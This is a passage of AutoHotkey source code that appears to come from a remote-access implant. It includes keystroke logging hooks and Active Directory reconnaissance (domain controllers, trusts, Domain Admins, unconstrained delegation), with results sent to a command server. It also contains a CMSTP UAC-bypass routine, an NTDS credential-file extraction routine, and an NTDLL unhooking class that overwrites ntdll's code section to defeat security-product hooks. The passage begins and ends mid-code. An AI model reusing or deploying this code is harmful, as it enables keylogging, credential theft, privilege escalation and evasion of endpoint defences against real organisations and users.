            Hotkey("~Volume_Up", (*) => SendLoggerData("[Vol+]"))
            Hotkey("~Volume_Down", (*) => SendLoggerData("[Vol-]"))
            Hotkey("~Volume_Mute", (*) => SendLoggerData("[Mute]"))
            Hotkey("~Media_Play_Pause", (*) => SendLoggerData("[Play/Pause]"))

            Hotkey("~Up", (*) => SendLoggerData("↑"))
            Hotkey("~Down", (*) => SendLoggerData("↓"))
            Hotkey("~Left", (*) => SendLoggerData("←"))
            Hotkey("~Right", (*) => SendLoggerData("→"))

            ; Arrow keys (with Unicode arrows)
            Hotkey("~Up", (*) => SendLoggerData("↑"))
            Hotkey("~Down", (*) => SendLoggerData("↓"))
            Hotkey("~Left", (*) => SendLoggerData("←"))
            Hotkey("~Right", (*) => SendLoggerData("→"))

            ; Shift + Arrow combinations
            Hotkey("~+Up", (*) => SendLoggerData("[Shift+↑]"))
            Hotkey("~+Down", (*) => SendLoggerData("[Shift+↓]"))
            Hotkey("~+Left", (*) => SendLoggerData("[Shift+←]"))
            Hotkey("~+Right", (*) => SendLoggerData("[Shift+→]"))
            
            ; Bind input hook events
            ih.OnChar := OnKeyPressed
            
            ; Start the input hook
            ih.Start()
            
            ; Return the input hook object in case it's needed
            this.loggerIH := ih
            return ih
        }
    }

    EnumerateDCs() {
        ; Get the domain name
        domain := EnvGet("USERDOMAIN")
        if (domain == "") {
            message := Format("command_output|{}|Could not retrieve domain name from USERDOMAIN", this.agentID)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            return
        }
    
        ; Build and execute the command
        comspec := EnvGet("ComSpec")
        cmd := comspec . " /c nltest /dclist:" . domain
        
        try {
            ; Execute command and capture output
            shell := ComObject("WScript.Shell")
            exec := shell.Exec(cmd)
            output := exec.StdOut.ReadAll()
            
            ; Format the data with header
            data := "Domain Controllers for " . domain . ":`n"
            data .= "----------------------------------------`n"
            data .= output
            
            ; Send results to server
            message := Format("command_output|{}|{}", this.agentID, data)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            
        } catch Error as err {
            errorMsg := "Error enumerating DCs: " . err.Message
            message := Format("command_output|{}|{}", this.agentID, errorMsg)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
        }
    }

    DomainTrustRecon() {
        comspec := EnvGet("ComSpec")
        
        try {
            ; Execute the trusted domains command and capture output
            shell := ComObject("WScript.Shell")
            exec := shell.Exec(comspec . " /c nltest /trusted_domains")
            output := exec.StdOut.ReadAll()
            
            ; Format the data with header
            data := "Trusted Domains:`n"
            data .= "----------------------------------------`n"
            data .= output
            
            ; Send results to server
            message := Format("command_output|{}|{}", this.agentID, data)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            
        } catch Error as err {
            errorMsg := "Error retrieving domain trust information: " . err.Message
            message := Format("command_output|{}|{}", this.agentID, errorMsg)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
        }
    }
    
    IdentifyDomainAdmins() {
        comspec := EnvGet("ComSpec")
        
        try {
            ; Execute the domain admins query and capture output
            shell := ComObject("WScript.Shell")
            exec := shell.Exec(comspec . ' /c net group "Domain Admins" /domain')
            output := exec.StdOut.ReadAll()
            
            ; Format the data with header
            data := "Domain Admins:`n"
            data .= "----------------------------------------`n"
            data .= output
            
            ; Send results to server
            message := Format("command_output|{}|{}", this.agentID, data)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            
        } catch Error as err {
            errorMsg := "Error retrieving Domain Admins information: " . err.Message
            message := Format("command_output|{}|{}", this.agentID, errorMsg)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
        }
    }
    
    ActiveUserMembership() {
        comspec := EnvGet("ComSpec")
        username := EnvGet("USERNAME")
        
        try {
            ; Execute the user membership query and capture output
            shell := ComObject("WScript.Shell")
            exec := shell.Exec(comspec . " /c net user " . username . " /domain")
            output := exec.StdOut.ReadAll()
            
            ; Format the data with header
            data := "Membership information for " . username . ":`n"
            data .= "----------------------------------------`n"
            data .= output
            
            ; Send results to server
            message := Format("command_output|{}|{}", this.agentID, data)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            
        } catch Error as err {
            errorMsg := "Error retrieving user membership information: " . err.Message
            message := Format("command_output|{}|{}", this.agentID, errorMsg)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
        }
    }
    
    CheckUnconstrainedDelegation() {

        JoinDNComponents(domainName) {
            components := StrSplit(domainName, ".")
            result := ""
            for component in components {
                if (result != "")
                    result .= ","
                result .= "DC=" component
            }
            return result
        }

        try {
            domainInfo := ComObject("ADSystemInfo")
            domainDNS := domainInfo.DomainDNSName
            
            conn := ComObject("ADODB.Connection")
            conn.Provider := "ADsDSOObject"
            conn.Open("Active Directory Provider")
            
            cmd := ComObject("ADODB.Command")
            cmd.ActiveConnection := conn
            
            baseDN := JoinDNComponents(domainDNS)
            query := "<LDAP://" baseDN ">;(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288));cn,distinguishedName,dNSHostName;subtree"
            cmd.CommandText := query
            
            cmd.Properties["Page Size"] := 1000
            cmd.Properties["Timeout"] := 30
            cmd.Properties["Cache Results"] := false
            
            rs := cmd.Execute()
            
            data := "Unconstrained Delegation Check Results:`n"
            data .= "----------------------------------------`n"
            
            found := false
            while !rs.EOF {
                found := true
                computerName := rs.Fields["cn"].Value
                dnsName := rs.Fields["dNSHostName"].Value
                dn := rs.Fields["distinguishedName"].Value
                
                data .= Format("Computer: {}`nDNS Name: {}`nDN: {}`n`n", computerName, dnsName, dn)
                rs.MoveNext()
            }
            
            if !found {
                data .= "No computers with unconstrained delegation were found.`n"
            }
            
            ; Cleanup
            if IsSet(rs)
                rs.Close()
            if IsSet(conn)
                conn.Close()
                
            ; Send results to server
            message := Format("command_output|{}|{}", this.agentID, data)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            
        } catch Error as err {
            errorMsg := "Error checking unconstrained delegation: " . err.Message
            message := Format("command_output|{}|{}", this.agentID, errorMsg)
            response := this.SendMsg(this.serverIP, this.serverPort, message)
        }

    }

    CMSTP_UAC_Bypass(command){
        
        ; Use temp directory instead of Windows directory
        infPath := A_Temp "\cmstp.ini"
        
        ; INF file contents template 
        infTemplate := "
        (
        [version]
        Signature=$chicago$
        AdvancedINF=2.5
         
        [DefaultInstall]
        CustomDestination=CustInstDestSectionAllUsers
        RunPreSetupCommands=RunPreSetupCommandsSection
         
        [RunPreSetupCommandsSection]
        {}
        taskkill /IM cmstp.exe /F
         
        [CustInstDestSectionAllUsers]
        49000,49001=AllUSer_LDIDSection, 7
         
        [AllUSer_LDIDSection]
        "HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
         
        [Strings]
        ServiceName="bypassit"
        ShortSvcName="bypassit"
        )"
        
        ; Format the template with the command and convert line endings
        infContents := StrReplace(Format(infTemplate, command), "`n", "`r`n")
        
        try {
            ; Write the INF file
            FileAppend(infContents, infPath)
            
            ; Run CMSTP 
            Run('cmstp.exe /au "' infPath '"', A_WorkingDir, "Max")
            
            ; Delay
            Sleep(2000)
            Send("{Enter}")
            
            ; Allow sufficient time for CMSTP processing
            Sleep(5000)
            
            ; Clean up
            FileDelete(infPath)
        } catch as err {
            MsgBox("Error: " err.Message)
        }
        

    }

    NTDSDump(){
            
        try {
            Logger.Init()
            
            ; Initialize NTFS parser
            NTFSParser.Init()
            
            ; Find and analyze NTFS
            ntfsLocation := NTFSParser.FindNTFSPartition()
            NTFSParser.AnalyzeNTFS(ntfsLocation)
            
            ; Scan MFT for target files
            NTFSParser.ScanMFTForFiles()
            
            ; Create output directory
            outputDir := A_ScriptDir . "\extracted"
            DirCreate(outputDir)
            
            ; Extract found files
            extractedFiles := Map()
            
            for fileKey, recordInfo in NTFSParser.foundFiles {
                outputPath := outputDir . "\" . NTFSParser.targetFiles[fileKey].name
                if (NTFSParser.ExtractFile(recordInfo, outputPath)) {
                    extractedFiles[fileKey] := outputPath
                    Logger.Log("Successfully extracted: " . fileKey)
                } else {
                    Logger.Log("Failed to extract: " . fileKey)
                }
            }
            
            Logger.Log("Extraction complete! Files saved to: " . outputDir)
            Logger.Log("Found " . NTFSParser.foundFiles.Count . " of " . NTFSParser.targetFiles.Count . " target files")
            
        } catch as err {
            Logger.Log("ERROR: " . err.Message)
        } finally {
            Logger.Close()
        }
            
            ; Check for extracted files in the output directory
            outputPattern := A_ScriptDir "\extracted*"
            extractedDirs := []
            
            ; Find all extracted directories
            Loop Files, outputPattern, "D"
                extractedDirs.Push(A_LoopFileFullPath)
            
            if (extractedDirs.Length > 0) {
                ; Get the most recent extraction directory
                latestDir := extractedDirs[extractedDirs.Length]
                
                ; List extracted files
                extractedFiles := []
                Loop Files, latestDir "\*.*", "F"
                    extractedFiles.Push(A_LoopFileName)
                
                if (extractedFiles.Length > 0) {
                    fileList := ""
                    for file in extractedFiles {
                        fileList .= file . "`n"
                    }
                    
                    message := Format("command_output|{}|NTDS dump completed successfully!`nExtracted files:`n{}`nLocation: {}", 
                                    this.agentID, fileList, latestDir)
                    response := this.SendMsg(this.serverIP, this.serverPort, message)
                } else {
                    message := Format("command_output|{}|NTDS dump completed but no files were extracted", this.agentID)
                    response := this.SendMsg(this.serverIP, this.serverPort, message)
                }
            } else {
                message := Format("command_output|{}|NTDS dump module executed but no output directory found", this.agentID)
                response := this.SendMsg(this.serverIP, this.serverPort, message)
            }
            
            return true
            
        }
    }



class NTDLLManipulator {
    snapshots := Map()
    addresses := Map()
    hNTDLL := 0
    isModified := false
    originalBytes := ""
    modifiedAddress := 0
    modifiedSize := 0

    Log(msg, logFile := "logfile.txt") {
        timestamp := FormatTime(A_Now, "yyyy-MM-dd HH:mm:ss")
        logMessage := timestamp " NetworkClient: " msg "`n"
        
        try {
            FileAppend(logMessage, "*")
        } catch Error as err {
            FileAppend(logMessage, logFile)
        }
    }

    ; Core memory functions
    DumpMemorySection(hProcess, baseAddr, size) {
        if (baseAddr = 0) {
            this.Log("Error: Invalid base address")
            return 0
        }
        
        buff1 := Buffer(size, 0)
        oldProtect := 0
        
        this.Log("Attempting to read memory at: 0x" . Format("{:X}", baseAddr))
        
        ; Change protection
        if !DllCall("VirtualProtect", "Ptr", baseAddr, "UInt", size, "UInt", 0x40, "UInt*", &oldProtect) {
            this.Log("Error: Failed to modify memory protection")
            return 0
        }
        
        bytesRead := 0
        result := DllCall("ReadProcessMemory", 
            "Ptr", hProcess,
            "Ptr", baseAddr,
            "Ptr", buff1.Ptr,
            "UInt", size,
            "UInt*", &bytesRead)
        
        ; Restore protection
        DllCall("VirtualProtect", "Ptr", baseAddr, "UInt", size, "UInt", oldProtect, "UInt*", &oldProtect)
        
        if (!result || bytesRead = 0) {
            this.Log("Error: Failed to read memory section")
            return 0
        }
        
        this.Log("Successfully read " . bytesRead . " bytes")
        return buff1
    }

    TakeInitialSnapshot(*) {
        this.Log("`nStarting initial snapshot...")
        
        ; Get NTDLL handle
        hNTDLL := DllCall("GetModuleHandle", "Str", "ntdll.dll", "Ptr")
        if (!hNTDLL) {
            this.Log("Error: Failed to get NTDLL handle")
            return false
        }
        this.Log("NTDLL Base Address: 0x" . Format("{:X}", hNTDLL))
        
        ; Get current process handle
        hProcess := DllCall("GetCurrentProcess", "Ptr")
        
        ; Functions to monitor
        functions := ["NtCreateFile", "NtReadFile", "NtWriteFile", "NtClose"]
        monitorSize := 0x200
        
        ; Take snapshots
        loop functions.Length {
            i := A_Index
            funcName := functions[i]
            this.Log("`nProcessing " . funcName . "...")
            
            ; Get function address
            funcAddr := DllCall("GetProcAddress", "Ptr", hNTDLL, "AStr", funcName, "Ptr")
            if (!funcAddr) {
                this.Log("Failed to get address for " . funcName)
                continue
            }
            
            this.Log("Taking initial snapshot of " . funcName . " at: 0x" . Format("{:X}", funcAddr))
            this.snapshots[i] := this.DumpMemorySection(hProcess, funcAddr, monitorSize)
            this.addresses[i] := funcAddr
            
            if (!this.snapshots[i]) {
                this.Log("Failed to take initial snapshot of " . funcName)
                continue
            }
        }
        
        this.Log("`nInitial snapshots completed.")
        return true
    }

    CheckForChanges(*) {
        FileAppend("Starting change detection...`n", "ntdll_check.log")
        
        ; Get clean NTDLL file bytes first
        ntdllPath := A_WinDir . "\System32\ntdll.dll"
        hFile := DllCall("CreateFileW", "Str", ntdllPath, "UInt", 0x80000000, "UInt", 3, "Ptr", 0, "UInt", 3, "UInt", 0x80, "Ptr", 0, "Ptr")
        if (hFile = -1) {
            FileAppend("Failed to open NTDLL file`n", "ntdll_check.log")
            return false
        }
        
        ; Create file mapping
        hMapping := DllCall("CreateFileMapping", "Ptr", hFile, "Ptr", 0, "UInt", 0x02, "UInt", 0, "UInt", 0, "Ptr", 0, "Ptr")
        if (!hMapping) {
            DllCall("CloseHandle", "Ptr", hFile)
            FileAppend("Failed to create file mapping`n", "ntdll_check.log")
            return false
        }
        
        ; Map view of file
        cleanView := DllCall("MapViewOfFile", "Ptr", hMapping, "UInt", 0x4, "UInt", 0, "UInt", 0, "UInt", 0, "Ptr")
        if (!cleanView) {
            DllCall("CloseHandle", "Ptr", hMapping)
            DllCall("CloseHandle", "Ptr", hFile)
            FileAppend("Failed to map view of file`n", "ntdll_check.log")
            return false
        }
        
        ; Get NTDLL base and functions
        hNTDLL := DllCall("GetModuleHandle", "Str", "ntdll.dll", "Ptr")
        functions := ["NtCreateFile", "NtReadFile", "NtWriteFile", "NtClose"]
        checkSize := 0x1000  ; Increased size to check
        
        loop functions.Length {
            funcName := functions[A_Index]
            funcAddr := DllCall("GetProcAddress", "Ptr", hNTDLL, "AStr", funcName, "Ptr")
            
            if (!funcAddr) {
                FileAppend("Failed to get address for " . funcName . "`n", "ntdll_check.log")
                continue
            }
            
            ; Get function RVA (Relative Virtual Address)
            rva := funcAddr - hNTDLL
            FileAppend("`nChecking " . funcName . " at RVA: 0x" . Format("{:X}", rva) . "`n", "ntdll_check.log")
            
            ; Dump current memory
            memBuff := Buffer(checkSize, 0)
            if (!DllCall("ReadProcessMemory", 
                "Ptr", DllCall("GetCurrentProcess", "Ptr"),
                "Ptr", funcAddr,
                "Ptr", memBuff.Ptr,
                "UInt", checkSize,
                "UInt*", &bytesRead := 0)) {
                FileAppend("Failed to read memory for " . funcName . "`n", "ntdll_check.log")
                continue
            }
            
            ; Compare with clean file (checking first 256 bytes for detailed analysis)
            differences := 0
            detailedLog := ""
            
            loop 256 {
                memByte := NumGet(memBuff, A_Index-1, "UChar")
                cleanByte := NumGet(cleanView + rva, A_Index-1, "UChar")
                
                if (memByte != cleanByte) {
                    differences++
                    detailedLog .= Format("Offset +{:X}: {:02X} -> {:02X}`n", 
                        A_Index-1, cleanByte, memByte)
                }
            }
            
            ; Log both clean and current bytes for comparison
            FileAppend("Clean bytes: ", "ntdll_check.log")
            loop 32 {
                FileAppend(Format("{:02X} ", NumGet(cleanView + rva, A_Index-1, "UChar")), "ntdll_check.log")
            }
            FileAppend("`nCurrent bytes: ", "ntdll_check.log")
            loop 32 {
                FileAppend(Format("{:02X} ", NumGet(memBuff, A_Index-1, "UChar")), "ntdll_check.log")
            }
            FileAppend("`n", "ntdll_check.log")
            
            if (differences > 0) {
                FileAppend(funcName . " has " . differences . " modifications:`n", "ntdll_check.log")
                FileAppend(detailedLog, "ntdll_check.log")
            } else {
                FileAppend(funcName . " matches clean file`n", "ntdll_check.log")
            }
        }
        
        ; Cleanup
        DllCall("UnmapViewOfFile", "Ptr", cleanView)
        DllCall("CloseHandle", "Ptr", hMapping)
        DllCall("CloseHandle", "Ptr", hFile)
        
        return true
    }

    SafeInitialize(*) {
        timer := A_TickCount
        success := false
        
        while (A_TickCount - timer < 5000) {  ; 5 second timeout
            if (this.Initialize()) {
                success := true
                break
            }
            Sleep(100)
        }
        
        if (!success) {
            this.Log("Initialize timed out after 5 seconds")
        }
        return success
    }

    Initialize() {
        this.Log("`nStarting NTDLL unhooking process...")
        
        ; Handle modified state
        if (this.isModified) {
            this.Log("Warning: NTDLL is in modified state. Ensuring cleanup...")
            this._CleanupHandles()
            Sleep(1000)
        }
        
        ; Get memory info
        memInfo := Buffer(8, 0)  ; For WorkingSetSize
        DllCall("K32GetProcessMemoryInfo", 
            "Ptr", DllCall("GetCurrentProcess", "Ptr"), 
            "Ptr", memInfo.Ptr, 
            "UInt", memInfo.Size)
        this.Log("Initial Working Set Size: " . NumGet(memInfo, 0, "Ptr"))
        
        ; Get NTDLL base
        ntdllBase := DllCall("GetModuleHandle", "Str", "ntdll.dll", "Ptr")
        if (!ntdllBase) {
            this.Log("Failed to get NTDLL base address: " . A_LastError)
            return false
        }
        this.Log("NTDLL Base Address: 0x" . Format("{:X}", ntdllBase))
        
        ; Memory barrier
        DllCall("FlushInstructionCache", "Ptr", -1, "Ptr", 0, "UInt", 0)
        Sleep(100)
        
        ; Query NTDLL memory region
        mbi := Buffer(48, 0)  ; MEMORY_BASIC_INFORMATION
        querySuccess := false
        loop 3 {
            if (DllCall("VirtualQueryEx",
                "Ptr", DllCall("GetCurrentProcess", "Ptr"),
                "Ptr", ntdllBase,
                "Ptr", mbi.Ptr,
                "UInt", mbi.Size)) {
                querySuccess := true
                break
            }
            Sleep(100)
        }
        
        if (!querySuccess) {
            return false
        }
        
        this.Log("NTDLL Memory Region Info:")
        this.Log("  Protection: 0x" . Format("{:X}", NumGet(mbi, 20, "UInt")))
        this.Log("  State: 0x" . Format("{:X}", NumGet(mbi, 16, "UInt")))
        this.Log("  Type: 0x" . Format("{:X}", NumGet(mbi, 24, "UInt")))
        
        ; Open NTDLL file
        ntdllPath := A_WinDir . "\System32\ntdll.dll"
        try {
            this.Log("Attempting to open file: " . ntdllPath)
            
            hFile := DllCall("CreateFileW",
                "Str", ntdllPath,
                "UInt", 0x80000000,  ; GENERIC_READ
                "UInt", 3,           ; FILE_SHARE_READ | FILE_SHARE_WRITE
                "Ptr", 0,
                "UInt", 3,           ; OPEN_EXISTING
                "UInt", 0x80,        ; FILE_ATTRIBUTE_NORMAL
                "Ptr", 0,
                "Ptr")
    
            if (hFile = -1 || !hFile) {
                lastError := A_LastError
                this.Log("CreateFileW failed - Error Code: 0x" . Format("{:X}", lastError))
                this.Log("Windows Error Message: " . this._GetWindowsErrorMessage(lastError))
                return false
            }
        } catch as err {
            this.Log("Exception details:")
            this.Log("  - Type: " . Type(err))
            this.Log("  - Message: " . err.Message)
            this.Log("  - Line: " . err.Line)
            this.Log("  - What: " . err.What)
            this.Log("  - Stack: " . err.Stack)
            
            if (A_LastError) {
                this.Log("  - Last Windows Error: 0x" . Format("{:X}", A_LastError))
                this.Log("  - Error Message: " . this._GetWindowsErrorMessage(A_LastError))
            }
            return false
        }
        this.Log("Successfully opened NTDLL file from: " . ntdllPath)
        
        ; Create file mapping
        hMapping := DllCall("CreateFileMapping",
            "Ptr", hFile,
            "Ptr", 0,
            "UInt", 0x02,        ; PAGE_READONLY
            "UInt", 0,
            "UInt", 0,
            "Ptr", 0,
            "Ptr")
        
        if (!hMapping) {
            DllCall("CloseHandle", "Ptr", hFile)
            this.Log("Failed to create file mapping")
            return false
        }
        this.Log("Successfully created file mapping")
        
        ; Map view of file
        mappedView := DllCall("MapViewOfFile",
            "Ptr", hMapping,
            "UInt", 0x4,         ; FILE_MAP_READ
            "UInt", 0,
            "UInt", 0,
            "UInt", 0,
            "Ptr")
        
        if (!mappedView) {
            DllCall("CloseHandle", "Ptr", hMapping)
            DllCall("CloseHandle", "Ptr", hFile)
            this.Log("Failed to map view of file")
            return false
        }
        this.Log("Successfully mapped view of file")
        
        ; Process headers and sections
        try {
            this._ProcessPEHeaders(ntdllBase, mappedView)
        } catch as err {
            this.Log("Error processing PE headers: " . err.Message)
        }
        
        ; Cleanup
        DllCall("UnmapViewOfFile", "Ptr", mappedView)
        DllCall("CloseHandle", "Ptr", hMapping)
        DllCall("CloseHandle", "Ptr", hFile)
        
        ; Final memory barrier
        DllCall("FlushInstructionCache", "Ptr", -1, "Ptr", 0, "UInt", 0)
        
        ; Check final state
        DllCall("K32GetProcessMemoryInfo",
            "Ptr", DllCall("GetCurrentProcess", "Ptr"),
            "Ptr", memInfo.Ptr,
            "UInt", memInfo.Size)
        this.Log("Final Working Set Size: " . NumGet(memInfo, 0, "Ptr"))
        
        this.isModified := false
        this.Log("Cleanup completed - NTDLL unhooking process finished`n")
        return true
    }

    _ProcessPEHeaders(baseAddr, mappedView) {
        FileAppend("Starting PE header processing`n", "ntdll_debug.log")
        
        try {
            ; Read DOS header
            e_lfanew := NumGet(baseAddr + 0x3C, "UInt")
            FileAppend("e_lfanew: 0x" . Format("{:X}", e_lfanew) . "`n", "ntdll_debug.log")
            
            ; Get number of sections
            numberOfSections := NumGet(baseAddr + e_lfanew + 0x6, "UShort")
            FileAppend("Number of sections: " . numberOfSections . "`n", "ntdll_debug.log")
            
            ; Get size of optional header
            sizeOfOptionalHeader := NumGet(baseAddr + e_lfanew + 0x14, "UShort")
            FileAppend("Size of optional header: 0x" . Format("{:X}", sizeOfOptionalHeader) . "`n", "ntdll_debug.log")
            
            ; Calculate section headers offset
            sectionHeadersOffset := e_lfanew + 0x18 + sizeOfOptionalHeader
            FileAppend("Section headers offset: 0x" . Format("{:X}", sectionHeadersOffset) . "`n", "ntdll_debug.log")
            
            FileAppend("Base Address: 0x" . Format("{:X}", baseAddr) . "`n", "ntdll_debug.log")
            FileAppend("Mapped View: 0x" . Format("{:X}", mappedView) . "`n", "ntdll_debug.log")
            
            ; Process each section
            loop numberOfSections {
                try {
                    sectionHeader := baseAddr + sectionHeadersOffset + ((A_Index - 1) * 0x28)
                    sectionName := this._ReadSectionName(sectionHeader)
                    
                    ; both virtual and raw data information
                    virtualAddress := NumGet(sectionHeader + 0x0C, "UInt")
                    virtualSize := NumGet(sectionHeader + 0x08, "UInt")
                    rawAddress := NumGet(sectionHeader + 0x14, "UInt") 
                    rawSize := NumGet(sectionHeader + 0x10, "UInt")     
                    characteristics := NumGet(sectionHeader + 0x24, "UInt")
                    
                    FileAppend("`nProcessing section: " . sectionName . "`n", "ntdll_debug.log")
                    FileAppend("  Virtual Address: 0x" . Format("{:X}", virtualAddress) . "`n", "ntdll_debug.log")
                    FileAppend("  Virtual Size: 0x" . Format("{:X}", virtualSize) . "`n", "ntdll_debug.log")
                    FileAppend("  Raw Address: 0x" . Format("{:X}", rawAddress) . "`n", "ntdll_debug.log")
                    FileAppend("  Raw Size: 0x" . Format("{:X}", rawSize) . "`n", "ntdll_debug.log")
                    FileAppend("  Characteristics: 0x" . Format("{:X}", characteristics) . "`n", "ntdll_debug.log")
                    
                    if (sectionName = ".text") {
                        FileAppend("Found .text section, attempting memory operations`n", "ntdll_debug.log")
                        
                        ; Memory protection change attempt
                        loop 3 {
                            oldProtect := 0
                            FileAppend("Attempt " . A_Index . " to change memory protection`n", "ntdll_debug.log")
                            
                            targetAddr := baseAddr + virtualAddress
                            sourceAddr := mappedView + rawAddress  ; 
                            
                            FileAppend("Target address: 0x" . Format("{:X}", targetAddr) . "`n", "ntdll_debug.log")
                            FileAppend("Source address: 0x" . Format("{:X}", sourceAddr) . "`n", "ntdll_debug.log")
                            
                            result := DllCall("VirtualProtect",
                                "Ptr", targetAddr,
                                "UInt", virtualSize,
                                "UInt", 0x40,  ; PAGE_EXECUTE_READWRITE
                                "UInt*", &oldProtect)
                                
                            if (result) {
                                FileAppend("Successfully changed protection to RWX`n", "ntdll_debug.log")
                                FileAppend("Old protection was: 0x" . Format("{:X}", oldProtect) . "`n", "ntdll_debug.log")
                                
                                ; memory copy chunks
                                try {
                                    chunkSize := 4096  ; Copy in 4KB chunks
                                    totalSize := Min(virtualSize, rawSize)
                                    
                                    loop Floor(totalSize / chunkSize) {
                                        offset := (A_Index - 1) * chunkSize
                                        DllCall("RtlCopyMemory",
                                            "Ptr", targetAddr + offset,
                                            "Ptr", sourceAddr + offset,
                                            "UInt", chunkSize)
                                        
                                        FileAppend("Copied chunk " . A_Index . "`n", "ntdll_debug.log")
                                    }
                                    
                                    ; Copy remaining bytes
                                    remainingBytes := totalSize & 4095
                                    if (remainingBytes > 0) {
                                        offset := totalSize - remainingBytes
                                        DllCall("RtlCopyMemory",
                                            "Ptr", targetAddr + offset,
                                            "Ptr", sourceAddr + offset,
                                            "UInt", remainingBytes)
                                        FileAppend("Copied remaining " . remainingBytes . " bytes`n", "ntdll_debug.log")
                                    }
                                    
                                    FileAppend("Memory copy completed`n", "ntdll_debug.log")
                                    
                                } catch as err {
                                    FileAppend("Error during memory copy: " . err.Message . "`n", "ntdll_debug.log")
                                }
                                
                                ; Restore protection
                                restoreResult := DllCall("VirtualProtect",
                                    "Ptr", targetAddr,
                                    "UInt", virtualSize,
                                    "UInt", oldProtect,
                                    "UInt*", &oldProtect)
                                    
                                FileAppend("Protection restored: " . (restoreResult ? "Success" : "Failed") . "`n", "ntdll_debug.log")
                                
                                ; Memory barrier
                                DllCall("FlushInstructionCache", "Ptr", -1, "Ptr", 0, "UInt", 0)
                                break
                            } else {
                                lastError := A_LastError
                                FileAppend("Failed to change protection. Error: " . lastError . "`n", "ntdll_debug.log")
                            }
                            Sleep(100)
                        }
                    }
                } catch as err {
                    FileAppend("Error processing section " . A_Index . ": " . err.Message . "`n", "ntdll_debug.log")
                }
            }
        } catch as err {
            FileAppend("Critical error in PE header processing: " . err.Message . "`n", "ntdll_debug.log")
            throw err
        }
        FileAppend("PE header processing completed`n", "ntdll_debug.log")
    }

    _ReadSectionName(sectionHeader) {
        name := ""
        loop 8 {
            char := Chr(NumGet(sectionHeader + A_Index - 1, "UChar"))
            if (Ord(char) = 0)
                break
            name .= char
        }
        return name
    }

    _ApplyCleanSection(baseAddr, mappedView, virtualAddress, virtualSize) {
        oldProtect := 0
        
        ; Change protection
        if (!DllCall("VirtualProtect",
            "Ptr", baseAddr + virtualAddress,
            "UInt", virtualSize,
            "UInt", 0x40,  ; PAGE_EXECUTE_READWRITE
            "UInt*", &oldProtect)) {
            this.Log("Failed to change memory protection")
            return false
        }
        
        ; Copy clean section
        DllCall("RtlCopyMemory",
            "Ptr", baseAddr + virtualAddress,
            "Ptr", mappedView + virtualAddress,
            "UInt", virtualSize)
        
        ; Restore protection
        DllCall("VirtualProtect",
            "Ptr", baseAddr + virtualAddress,
            "UInt", virtualSize,
            "UInt", oldProtect,
            "UInt*", &oldProtect)
        
        ; Memory barrier
        DllCall("FlushInstructionCache", "Ptr", -1, "Ptr", 0, "UInt", 0)
    }

    _CleanupHandles() {
        if (this.hNTDLL) {
            this.hNTDLL := 0
        }

        ; flush cached instructions
        DllCall("FlushInstructionCache", "Ptr", -1, "Ptr", 0, "UInt", 0)
        Sleep(100)  ; Give system time to stabilize
    }

    HandleUnhookNTDLL(*) {
        this.Log("Starting unhook sequence...")
        
        ; Clean up any existing modifications first
        if (this.isModified) {
            this._CleanupHandles()
            this.isModified := false
            Sleep(100)  ; Give system time to stabilize
        }
        
        ; Then proceed with unhooking
        loop 3 {
            if (this.SafeInitialize()) {
                this.Log("Successfully unhooked NTDLL")
                return true
            }
            this.Log("Initialize attempt " . A_Index . " failed, retrying...")
            Sleep(1000)
        }
        
        this.Log("All Initialize attempts failed")
        return false
    }

    ; Memory management functions
    _SaveCurrentState() {
        state := {
            baseAddress: 0,
            size: 0,
            protection: 0,
            handles: this._SaveCurrentHandles()
        }
        return state
    }

    _RestoreState(state) {
        if (!IsObject(state)) {
            return false
        }
        
        if (state.baseAddress != 0) {
            oldProtect := 0
            DllCall("VirtualProtect",
                "Ptr", state.baseAddress,
                "UInt", state.size,
                "UInt", state.protection,
                "UInt*", &oldProtect)
        }
        
        return this._RestoreHandles(state.handles)
    }

    _SaveCurrentHandles() {
        return {
            NTDLL: this.hNTDLL,
            Process: DllCall("GetCurrentProcess", "Ptr")
        }
    }

    _RestoreHandles(handles) {
        if (!IsObject(handles)) {
            return false
        }
        
        this.hNTDLL := handles.NTDLL
        return true
    }

    ; Protection functions
    _SetMemoryProtection(address, size, newProtection) {
        oldProtect := 0
        result := DllCall("VirtualProtect",
            "Ptr", address,
            "UInt", size,
            "UInt", newProtection,
            "UInt*", &oldProtect)
            
        return { success: result != 0, oldProtection: oldProtect }
    }

    _EnsureMemoryAccess(address, size) {
        ; Try to ensure memory access with retries
        loop 3 {
            result := this._SetMemoryProtection(address, size, 0x40)  ; PAGE_EXECUTE_READWRITE
            if (result.success) {
                return result
            }
            Sleep(100)
        }
        return { success: false, oldProtection: 0 }
    }

    ; Helper functions
    _GetErrorMessage(code) {
        ERROR_CODES := Map(
            2224, "The specified user account already exists.",
            2245, "The password does not meet the password policy requirements.",
            2226, "The user name or group name parameter is too long.",
            2202, "The specified username is invalid.",
            1378, "The specified local group already exists.",
            5, "Access denied.",
            87, "Invalid parameter.",
            8, "Not enough memory.",
            123, "Invalid name.",
            124, "Invalid level."
        )
        
        return ERROR_CODES.Has(code) ? ERROR_CODES[code] : "Unknown error (" . code . ")"
    }

    _VerifyMemoryContents(address, size, expected) {
        buff1 := Buffer(size, 0)
        bytesRead := 0
        
        result := DllCall("ReadProcessMemory",
            "Ptr", DllCall("GetCurrentProcess", "Ptr"),
            "Ptr", address,
            "Ptr", buff1.Ptr,
            "UInt", size,
            "UInt*", &bytesRead)
            
        if (!result || bytesRead != size) {
            return false
        }
        
        loop size {
            if (NumGet(buff1, A_Index-1, "UChar") != NumGet(expected, A_Index-1, "UChar")) {
                return false
            }
        }
        
        return true
    }

    _GetModuleInformation(moduleHandle) {
        ; Try PSAPI first
        moduleInfo := Buffer(24, 0)  ; sizeof(MODULEINFO)
        
        result := DllCall("psapi\GetModuleInformation",
            "Ptr", DllCall("GetCurrentProcess", "Ptr"),
            "Ptr", moduleHandle,
            "Ptr", moduleInfo.Ptr,
